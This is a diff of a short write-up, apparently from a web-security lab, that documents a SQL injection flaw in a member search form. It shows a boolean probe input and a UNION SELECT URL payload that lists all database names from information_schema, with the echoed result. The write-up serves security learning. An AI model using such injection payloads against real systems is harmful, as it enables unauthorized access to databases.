@@ -4,13 +4,18 @@ The GET parameter in the member search form is vulnerable to sql Sql_Injection_b
 
 ## Method
 
-Go to the member search page (<http://192.168.1.102/?page=member>)
+Go to the member search page (<http://192.168.1.102/?page=member>)  
 In the search field search '1 and 1 = 1' (which shows you that the form is vulnerable)
 
 ## Manipulation
 
 getting current database name and listing all databases:
+
+```
+
 http://192.168.1.102/?page=member&id=42 union select database(), schema_name from information_schema.schemata&Submit=Submit
+
+```
 
 result:
 ID: 42 union select database(), schema_name from information_schema.schemata
